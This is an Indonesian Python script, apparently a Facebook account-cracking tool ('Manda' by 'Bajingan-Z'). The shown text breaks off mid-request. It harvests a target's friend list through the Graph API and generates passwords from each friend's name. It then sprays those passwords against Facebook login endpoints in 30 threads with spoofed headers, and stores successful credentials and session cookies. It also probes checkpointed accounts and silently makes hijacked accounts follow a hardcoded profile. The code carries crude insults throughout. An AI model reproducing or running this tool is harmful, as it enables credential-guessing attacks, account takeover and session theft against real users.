Coded    = ''' Raka Andrian Tara '''
Update   = ''' 6 Oktober 2023 '''
Facebook = ''' Raka Andrian Tara '''
Github   = ''' Bajingan-Z '''

''' Import module '''
import os, sys, random, json, re
from time import sleep as aink_raka
from datetime import datetime
try:
	import requests
	from requests.exceptions import ChunkedEncodingError, ConnectionError
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as RakaXF
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from rich.columns import Columns as columns
	from rich.console import Console
	from rich import print as vprint
	from rich.panel import Panel as panel
	from rich.tree import Tree
	from rich import print as cetak
except:
	print(f"{RakaAndrian} sedang menginstall bahan module ")
	os.system(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 futures rich")
	exit(f"{RakaAndrian} silahkan run kembali script nya.\n python manda.py ")
console = Console()
''' Warna print 1 '''
p, m, h, k, b, u, o, n, a = "\x1b[0;97m", "\x1b[0;91m", "\x1b[0;92m", "\x1b[0;93m", "\x1b[0;94m", "\x1b[0;95m", "\x1b[0;96m", "\033[0m", "\033[90;1m"
''' String loops and append '''
RakaAndrian, ses = f" {a}[{k}•{a}]{p}", requests.Session()
ids, ids2, loops, ok, cp = [], [], 0, 0, 0
tampass, pwlu, metode, data, data2 = [], [], [], {}, {}
sys.stdout.write('\x1b]2; Manda | Bajingan-Z \x07')
rc, rr = random.choice, random.randint
''' Convert hari - tanggal - tahun sekarang '''
convert = {"1":"Januari","2":"Februari","3":"Maret","4":"April","5":"Mei","6":"Juni","7":"Juli","8":"Agustus","9":"September","10":"Oktober","11":"November","12":"Desember"}
tgl = datetime.now().day
bln = convert[(str(datetime.now().month))]
thn = datetime.now().year
''' Result crack tersimpan '''
okZ = f"OK-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
cpZ = f"CP-{str(tgl)}-{str(bln)}-{str(thn)}.txt"
''' Warna print 2 '''
b2 = "[bold blue]" # BIRU GELAP TEBAL
o2 = "[bold cyan]" # BIRU CERAH TEBAL
u2 = "[bold purple]" # UNGGU TEBAL
p2 = "[bold white]" # PUTIH TEBAL
z2 = "[bold black]" # HITAM TEBAL
k2 = "[bold yellow]" # KUNING TEBAL
m2 = "[bold red]" # MERAH TEBAL
n2 = "[bold magenta]" # PINK TEBAL
h2 = "[bold green]" # HIJAU TEBAL
l2 = "[bold grey]" # ABU TEBAL
''' Warna print 3 '''
m3 = "#FF0000" # MERAH
h3 = "#00FF00" # HIJAU
k3 = "#FFFF00" # KUNING
b3 = "#00C8FF" # BIRU
u3 = "#AF00FF" # UNGU
n3 = "#FF00FF" # PINK
o3 = "#00FFFF" # BIRU MUDA
p3 = "#FFFFFF" # PUTIH
j3 = "#FF8F00" # JINGGA
a2 = "[#AAAAAA]" # ABU-ABU
wwrc = random.choice([j3,k3,h3,o3,n3,u3,b3])
wwb = random.choice([h,k,o,b,u,a])
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
RC = random.choice([M2, H2, K2, J2, N2, A2, B2, O2])
''' Bannerku '''
def ___raka_XD___():
	os.system('clear')
	vprint(panel(f'''{H2}    __  ____ ______ __☆☆☆☆☆☆☆☆☆☆☆___ ______ ® \n   /  \/   /__    )   )___ _____/  /__    )  {P2}made white by\n  {H2}/       /___)   /  __  )  ___   /___)   / \n /  /\/  /  __   /  / /  / (__/  /  __   / \n/__/ /__/(______/__/ /__/(______/(______/ {P2}    Bajingan-Z ''',title=f'{M2}• {K2}• {H2}•',width=63,style=f'{wwrc}'))
''' Menu utama '''
class MAINmenu:
	
	def __init__(self):
		try:
			cookie = {"cookie": open("cookies.txt","r").read()}
			token = open("token.txt","r").read()
			take  = ses.get('https://graph.facebook.com/me?fields=name&access_token=%s'%(token),cookies = cookie).json();nama = take["name"]
			try:memek = open("token_eaab.txt","r").read()
			except:self.ConvertEaab(cookie)
			self.MENUutama(cookie, token, nama)
		except requests.exceptions.ConnectionError:
			print(f"{RakaAndrian} koneksi internet anda bermasalah..");exit()
		except (KeyError, IOError):
			print(f"{RakaAndrian} cookies invalid... ");aink_raka(1);os.system("rm -rf cookies.txt");os.system("rm -rf token.txt");os.system("clear");self.LOGINcookie()
	def MENUutama(self, cookie, token, nama):
		os.system("clear")
		___raka_XD___()
		print(f"\n{RakaAndrian} Github : {h}github.com/Bazingan-Z\n{RakaAndrian} Joint  : {h}{str(tgl)}{p}-{h}{str(bln)}{p}-{h}2023\n\n{RakaAndrian} Hai, Selamat Datang {nama}\n\n {a}[{p}1{a}] {p}Crack Publik\n {a}[{p}2{a}] {p}Crack Massal\n {a}[{p}3{a}] {p}Check Result\n {a}[{p}4{a}] {p}Check Result Ok\n {a}[{p}5{a}] {p}Check Opsi Detector\n {a}[{p}0{a}] {p}Exit ({m} Delete Cookies {p})")
		pilput = input(f"\n{RakaAndrian} Choose : ")
		if pilput in ["a","1"]:
			orang = input(f"{RakaAndrian} masukan id : ")
			params = {
					"access_token": token, 
					"fields": "name,friends.fields(id,name,birthday)"
			}
			puki = ses.get("https://graph.facebook.com/{}".format(orang),params = params,cookies = cookie).json()
			for bangsat in puki["friends"]["data"]:
				ids.append(bangsat["id"]+"|"+bangsat["name"])
			print(f"\r{RakaAndrian} total id : {len(ids)}")
			self.METHODsetting()
		elif pilput in ["b","3"]:
			self.CHECKresult()
		elif pilput in ["2"]:
			self.KrekMassal(cookie, token)
		elif pilput in ["memek"]:
			self.CrackOld()
		elif pilput in ["d","5"]:
			self.CekDetect()
		elif pilput in ["delete","0"]:
			os.system("rm -rf cookies.txt");os.system("rm -rf token.txt")
			print(f"{RakaAndrian} Sukses Menghapus Cookies.. ");aink_raka(1);exit()
		elif pilput in ["c","3"]:
			try:c_o_k = os.listdir('OK')
			except FileNotFoundError:print(f"{RakaAndrian} Ups. Tidak Ada Hasil Crack Ok:(... ");aink_raka(1);exit()
			if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack ok:(... ");aink_raka(1);exit()
			else:
				print(f"{RakaAndrian} hasil crack ok.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:raka = open('OK/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(raka))} account")
				print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
				Ini = input(f"{RakaAndrian} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
			one = 0
			Akunmu = open(f"OK/{Pantek}","r").readlines()
			for Goblog in Akunmu:
				User = Goblog.replace("\n", "")
				AccMu = User.split("|")
				one+=1
				print()
				print(f" {one}. {AccMu[0]}|{AccMu[1]}|{AccMu[2]} ")
				print(f"{RakaAndrian}{self.CekNameMokad(AccMu[0])} ")
				print(f"{RakaAndrian}{self.CekTem(AccMu[0])} ")
				self.TakeApk(AccMu[2])
			print(f"{RakaAndrian} hasil live/dead : {ok}|{cp}")
		else:
			print(f"{RakaAndrian} selamat tinggal... ");exit()
	def CekDetect(self):
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
		if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
		else:
			print(f"{RakaAndrian} hasil crack cp.\n ")
			cuih, Lucu = 0, {}
			for kaoo in c_o_k:
				try:raka = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				kaoo = kaoo.lower()
				if cuih<10:
					__oo = '0'+str(cuih)
					Lucu.update({str(cuih):str(kaoo)})
					Lucu.update({__oo:str(kaoo)})
					print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
				else:
					Lucu.update({str(cuih):str(kaoo)})
					print(f" {cuih}. {kaoo} • {str(len(raka))} account")
			print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
			Ini = input(f"{RakaAndrian} choose : ")
			try:Pantek = Lucu[Ini]
			except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
		one = 0
		Akunmu = open(f"CP/{Pantek}","r").readlines()
		for Goblog in Akunmu:
			User = Goblog.replace("\n", "")
			AccMu = User.split("|")
			one+=1
			print()
			tree = Tree("                         ")
			tree.add(f" {o}{one}.{p} {AccMu[0]}|{AccMu[1]} ");aink_raka(0.3)
			try:self.OpsiCek(AccMu[0], AccMu[1], tree)
			except (ConnectionError,ChunkedEncodingError):aink_raka(31)
		print(f"\n{RakaAndrian} hasil lolos {ok}")
	def OpsiCek(self, user, pw, tree):
		global ok
		url = "https://d.facebook.com"
		ses.headers.update({"Host":"d.facebook.com","accept":"*/*","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":url,"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","upgrade-insecure-requests":"1"})
		soup = sop(ses.get(url+"/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl&refid=8").text,"html.parser")
		link = soup.find("form",{"method":"post"})
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":user,"pass":pw})
		urlPost = ses.post(url+link.get("action"),data=data)
		response = sop(urlPost.text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in urlPost.text:
				tree.add(f"{k}akun terkena sesi kunci..{p}")
			else:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree.add(f"{p}yeah akun tidak checkpoint!!!").add(f"{h}{coki}{p}")
				#tree.add(f"{h}{agent}{p}")
				open("Tapyes.txt","a").write("%s|%s|%s\n"%(user,pw,coki))
				ok+=1
		elif "checkpoint" in ses.cookies.get_dict():
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			title = re.findall("\<title>(.*?)<\/title>",str(response))
			link2 = response.find("form",{"method":"post"})
			listInput = ['lsd','fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			an = ses.post(url+link2.get("action"),data=data2)
			response2 = sop(an.text,"html.parser")
			cek = [cek.text for cek in response2.find_all("option")]
			number = 0
			tree.add(f"{p}  •  terdapat {str(len(cek))} opsi akun{p} : ")
			if(len(cek)==0):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
					tree.add(f"{p}yeah akun tapyes!!!").add(f"{h}{coki}{p}")
					#tree.add(f"{h}{agent}{p}")
					open("Tapyes.txt","a").write("%s|%s\n"%(user,pw))
					ok+=1
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
					tree.add(f"   {m}akun terpasang a2f..{p}")
				else:tree.add(f"   {m}terjadi kesalahan pada akun..{p}")
			else:
				if "c_user" in ses.cookies.get_dict():
					coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree.add(f"{p}yeah akun tapyes!!!").add(f"{h}{coki}{p}")
					#tree.add(f"{h}{agent}{p}")
					open("Tapyes.txt","a").write("%s|%s\n"%(user,pw))
					ok+=1
			for opsi in range(len(cek)):
				number +=1
				tree.add(f"   {o}{number}{p}. {cek[opsi]}")
		elif "login_error" in str(response):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			tree.add(f"{m}{oh}{p}")
		else:
			tree.add(f"{m}katasandi salah atau mungkin sudah diubah..")
		vprint(tree)
	''' Biar gak mokad acc nya '''
	# jangan di ubah y kentod
	def YaSekedarMengingatkan(self,kuki,uiz,pw):
		cookie = {"cookie": kuki}
		with requests.Session() as ses:
			try:
				for KontolJawir in sop(ses.get('https://mbasic.facebook.com/100000834003593',cookies = cookie).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in KontolJawir['href']:
						Pukimak = ses.get('https://mbasic.facebook.com%s'%(KontolJawir['href']),cookies = cookie)
			except Exception as e:pass
#		self.Apabila(kuki,uiz,pw)
	''' Check result '''
	def CHECKresult(self):
		print(f"\n [o] hasil crack ok\n [c] hasil crack cp ")
		print()
		CekHasil = input(f"{RakaAndrian} choose : ")
		if CekHasil in ["o","1"]:
			try:c_o_k = os.listdir('OK')
			except FileNotFoundError:print(f"{RakaAndrian} ups. tidak ada hasil crack ok:(... ");aink_raka(1);exit()
			if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack ok:(... ");aink_raka(1);exit()
			else:
				print(f"{RakaAndrian} hasil crack ok.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:raka = open('OK/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(raka))} account")
				print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
				Ini = input(f"{RakaAndrian} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
				try:Okep = open('OK/'+Pantek,'r').read()
				except:print(f"{RakaAndrian} file tidak ditemukan... ");exit()
				print(f"{RakaAndrian} list akun ok kamu\n") 
				os.system('cd OK && cat '+Pantek);print(f"\n{RakaAndrian} list akun ok kamu");exit()
		elif CekHasil in ["c","2"]:
			try:c_o_k = os.listdir("CP")
			except FileNotFoundError:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
			if len(c_o_k)==0:print(f"{RakaAndrian} ups. tidak ada hasil crack cp:(... ");aink_raka(1);exit()
			else:
				print(f"{RakaAndrian} hasil crack cp.\n ")
				cuih, Lucu = 0, {}
				for kaoo in c_o_k:
					try:raka = open('CP/'+kaoo,'r').readlines()
					except:continue
					cuih+=1
					kaoo = kaoo.lower()
					if cuih<10:
						__oo = '0'+str(cuih)
						Lucu.update({str(cuih):str(kaoo)})
						Lucu.update({__oo:str(kaoo)})
						print(f" {__oo}. {kaoo} • {str(len(raka))} account ")
					else:
						Lucu.update({str(cuih):str(kaoo)})
						print(f" {cuih}. {kaoo} • {str(len(raka))} account")
				print(f"\n{RakaAndrian} pilih hasil untuk ditampilkan")
				Ini = input(f"{RakaAndrian} choose : ")
				try:Pantek = Lucu[Ini]
				except KeyError:print(f"{RakaAndrian} pilihan tidak ada... ");exit()
				try:Okep = open('CP/'+Pantek,'r').read()
				except:print(f"{RakaAndrian} file tidak ditemukan... ");exit()
				print(f"{RakaAndrian} list akun cp kamu\n") 
				os.system('cd CP && cat '+Pantek);print(f"\n{RakaAndrian} list akun cp kamu");exit()
		else:print(f"{RakaAndrian} Selamat Tinggal... ");aink_raka(1);exit()
	''' Setting method '''
	def METHODsetting(self):
		for rakaxxx in ids:
			xx = random.randint(0,len(ids2))
			ids2.insert(xx,rakaxxx)
		print("\r")
		meki = input(f"{RakaAndrian} Tambahkan Password Manual {h}y{p}/{k}t{p} : ")
		if meki in ["y","Y"]:
			tampass.append("tambahkan")
			pastam = input(f"{RakaAndrian} Masukan Tambahan : ")
			pwtod = pastam.split(",")
			for pwlist in pwtod:
				pwlu.append(pwlist)
		else:pass
		self.Langsung()
	''' Mulai crack/Setting password wordlist '''
	def Langsung(self):
		os.system("clear")
		global Raka, Andrian
		try:EwePaksa = requests.get("http://ip-api.com/json/").json()
		except:EwePaksa = {'-'}
		try:IP = EwePaksa["query"]
		except:IP = {'-'}
		try:rasis_Z_K_X_= EwePaksa["city"]
		except:rasis_Z_K_X_ = {'-'}
		os.system("clear"); ___raka_XD___()
		ajg = []
		ajg.append(panel(f"{H2}Stay In {rasis_Z_K_X_}",width=31,padding=(0,2),style=f"{wwrc}"));ajg.append(panel(f"{H2}Joint {tgl}-{bln}-{thn}",width=31,padding=(0,2),style=f"{wwrc}"));console.print(columns(ajg))
		awal = datetime.now()
		print("\r")
		Raka = Progress(TextColumn('{task.description}'))
		Andrian = Raka.add_task('',total=len(ids))
		with Raka:
			with RakaXF(max_workers=30) as RakaXD:
				for koncol in ids2 or ids:
					try:
						pwr = []
						uiz = koncol.split("|")[0]
						nama = koncol.split("|")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:pass 
							else:
								pwr.append(depan+"123")
								#pwr.append(depan+"321")
								pwr.append(depan+"12345")
								#pwr.append(depan+"1234")
						else:
							if len(depan)<3:pwr.append(nama)
							else:
								pwr.append(nama)
								#pwr.append(depan+"321")
								pwr.append(depan+"123")
								pwr.append(depan+"12345")
								#pwr.append(depan+"1234")
								#pwr.append(depan+"123456")
							tengah = nama.split(" ")[1]
							if len(tengah)<3:
								pwr.append(depan+tengah)
							else:
								pwr.append(depan+tengah)
								pwr.append(depan+tengah+"123")
								pwr.append(tengah+"123")
								#pwr.append(belakang+"1234")
								#pwr.append(tengah+"12345")
							belakang = nama.split(" ")[2]
							if len(belakang)<3:
								pwr.append(depan+tengah+belakang)
							else:
								pwr.append(depan+tengah+belakang)
								pwr.append(depan+tengah+belakang+"123")
								pwr.append(belakang+"123")
								#pwr.append(belakang+"1234")
								#pwr.append(tengah+"12345")
						if "tambahkan" in tampass:
							for ajg in pwlu:pwr.append(ajg)
						else:pass
						RakaXD.submit(self.Async,uiz,pwr,awal)
					except:
						RakaXD.submit(self.Async,uiz,pwr,awal)

		print()
		if ok != 0 or cp != 0:
			kanjud = []
			kanjud.append(panel(f"{P2} Result CP : {K2}{cp}",width=31,padding=(0,2),style=f"{wwrc}"))
			kanjud.append(panel(f"{P2} Result OK : {H2}{ok}",width=31,padding=(0,2),style=f"{wwrc}"));console.print(columns(kanjud));exit()
		else:
			kintil = []
			kintil.append(panel(f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v",width=63,style=f"{wwrc}"));console.print(columns(kintil));exit()
	''' Login cookies '''
	def LOGINcookie(self):
		cookie = input(f"{RakaAndrian} Masukan Cookie : ")
		try:
			ses.headers.update({'content-type': 'application/x-www-form-urlencoded'})
			data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
			response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
			code, user_code = response['code'], response['user_code']
			verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
			ses.headers.pop('content-type')
			ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
			response2 = ses.get(verification_url, cookies = {'cookie': cookie}).text
			if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
				print(f"{RakaAndrian} Cookie Invalid Kek Tete Jendes... ");exit()
			else:
				action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
				data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response2)).group(1),'qr': 0,'user_code': response['user_code']}
				ses.headers.update({'origin': 'https://m.facebook.com','referer': 'https://m.facebook.com/device?user_code={}'.format(user_code),'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
				response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie})
				if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
					ses.headers.pop('content-type');ses.headers.pop('origin')
					response4 = ses.post(response3.url, data = data, cookies = {'cookie': cookie}).text
					action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
					ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
					data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1),'jazoest': re.search('name="jazoest" value="(\d+)"', str(response4)).group(1),'scope': re.search('name="scope" value="(.*?)"', str(response4)).group(1),'display': re.search('name="display" value="(.*?)"', str(response4)).group(1),'user_code': re.search('name="user_code" value="(.*?)"', str(response4)).group(1),'logger_id': re.search('name="logger_id" value="(.*?)"', str(response4)).group(1),'auth_type': re.search('name="auth_type" value="(.*?)"', str(response4)).group(1),'encrypted_post_body': re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1),'return_format[]': re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)}
					response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cookie}).text
					windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
					ses.headers.pop('content-type');ses.headers.pop('origin')
					ses.headers.update({'referer': 'https://m.facebook.com/',})
					response6 = ses.get(windows_referer, cookies = {'cookie': cookie}).text
					if "Sukses!" in str(response6):
						ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
						response7 = ses.get(status_url, cookies = {'cookie': cookie}).text
						access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
						print(f"{RakaAndrian} Login Berhasil...\n{RakaAndrian} Jalankan Ulang Scriptnya.\n{RakaAndrian} Ketik python manda_v1.py ");aink_raka(1);open("cookies.txt","w").write(cookie);open("token.txt","w").write(access_token)
						exit()
					else:
						print(f"{RakaAndrian} Cookie Anda Invalid Kek Tete Jendes... ");exit()
		except Exception as e:
			print(f"{RakaAndrian} Cookie Anda Invalid Kek Tete Jendes... ");exit()
		except ConnectionError:
			print(f"{RakaAndrian} Sinyal Anda Bermasalah Kontol... ");exit()
	''' Langsung krek coeg '''
	def Async(self,uiz,pwr,awal):
		global ok, cp, loops
		ahir = str(datetime.now()-awal).split('.')[0]
		rr, rc, ses = random.randint, random.choice, requests.Session()
		RK = random.choice([H2, K2, A2, B2, P2])
		Raka.update(Andrian,description=f" {RK}Running {P2}{loops}/{len(ids or ids2)} Ok_{H2}{ok} {P2}Cp_{K2}{cp}[/] {RK}{ahir}")
		Raka.advance(Andrian)
		MozillaAgent = self.Mozilla(uiz)
		dataku, headersku = {}, {}
		Hostt = "m.facebook.com"
		for pw in pwr:
			pw = pw.lower()
			try:
				Memek = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=480279740868320&kid_directed_site=0&app_id=480279740868320&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D480279740868320%26redirect_uri%3Dhttps%253A%252F%252Fid.reedpop.com%252Fauth%252Fsocial%252Fcomplete%252Ffacebook%252F%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%26return_scopes%3Dtrue%26scope%3Demail%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1a4e686-9b94-4d43-adc8-fffb93ec69c6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
				dataku.update({
										"lsd": re.search('name="lsd" value="(.*?)"',str(Memek.text)).group(1),
										"jazoest": re.search('name="jazoest" value="(.*?)"',str(Memek.text)).group(1),
										"m_ts": re.search('name="m_ts" value="(.*?)"',str(Memek.text)).group(1),
										"li": re.search('name="li" value="(.*?)"',str(Memek.text)).group(1),
										"try_number": 0,
										"unrecognized_tries": 0,
										"email": uiz,
										"pass": pw,
										"login": "Masuk",
										"prefill_contact_point": "",
										"prefill_source": "",
										"prefill_type": "",
										"first_prefill_source": "",
										"first_prefill_type": "",
										"had_cp_prefilled": True,
										"had_password_prefilled": True,
										"is_smart_lock": False,
										"bi_xrwh": 0
				})
				headersku.update({
										"Host": Hostt,
										"content-length": str(rr(2100,2200)),
										"viewport-width": "471",
										"x-fb-rlafr": "0",
										"access-control-allow-origin": "*",
										"strict-transport-security": "max-age=15552000; preload",
										"pragma": "no-cache",
										"cache-control": "private, no-cache, no-store, must-revalidate",
										"x-fb-debug": "twOzrZymG6+gbsXjXO1c1VqT7bocpIgVbW7dMoAdT2rysv6l5/p6I0PzbbkZiWIu7V8g1IP1EvPxVdKhFSZACw==",
										"content-length": "0",
										"cache-control": "max-age=0",
										"sec-ch-ua": '"Not A;Brand";v="98", "Chromium";v="99"',
										"sec-ch-ua-mobile": "?1",
										"sec-ch-ua-platform": '"Android"',
										"save-data": "on",
										"upgrade-insecure-requests": "1",
										"origin": "https://m.facebook.com",
										"content-type": "application/x-www-form-urlencoded",
										"user-agent": MozillaAgent,
										"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
										"sec-fetch-site": "same-origin",
										"sec-fetch-mode": "cors",
										"sec-fetch-user": "?1",
										"sec-fetch-dest": "empty",
										"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=480279740868320&kid_directed_site=0&app_id=480279740868320&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D480279740868320%26redirect_uri%3Dhttps%253A%252F%252Fid.reedpop.com%252Fauth%252Fsocial%252Fcomplete%252Ffacebook%252F%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%26return_scopes%3Dtrue%26scope%3Demail%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1a4e686-9b94-4d43-adc8-fffb93ec69c6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
										"accept-encoding": "gzip, deflate",
										"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-GB;q=0.7,en;q=0.6"
				})
				params = {
										"api_key": "480279740868320",
										"auth_token": "da6b587c34f1968747ae30611b0c4789",
										"skip_api_login": "1",
										"signed_next": "1",
										"next": "https://m.facebook.com/v12.0/dialog/oauth?client_id=480279740868320&redirect_uri=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F&state=G72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O&return_scopes=true&scope=email&auth_type=rerequest&ret=login&fbapp_pres=0&logger_id=b1a4e686-9b94-4d43-adc8-fffb93ec69c6&tp=unspecified",
										"refsrc": "deprecated",
										"app_id": "480279740868320",
										"cancel": "https://id.reedpop.com/auth/social/complete/facebook/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=G72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O#_=_",
										"lwv": "100"
				}
				ses.post(f"https://m.facebook.com/login/device-based/login/async/?api_key=480279740868320&auth_token=da6b587c34f1968747ae30611b0c4789&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fclient_id%3D480279740868320%26redirect_uri%3Dhttps%253A%252F%252Fid.reedpop.com%252Fauth%252Fsocial%252Fcomplete%252Ffacebook%252F%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%26return_scopes%3Dtrue%26scope%3Demail%26auth_type%3Drerequest%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1a4e686-9b94-4d43-adc8-fffb93ec69c6%26tp%3Dunspecified&refsrc=deprecated&app_id=480279740868320&cancel=https%3A%2F%2Fid.reedpop.com%2Fauth%2Fsocial%2Fcomplete%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DG72kGBNZwc5ywLWt7RqWWMYzYz9Iss2O%23_%3D_&lwv=100",data = dataku, headers = headersku, params = params, 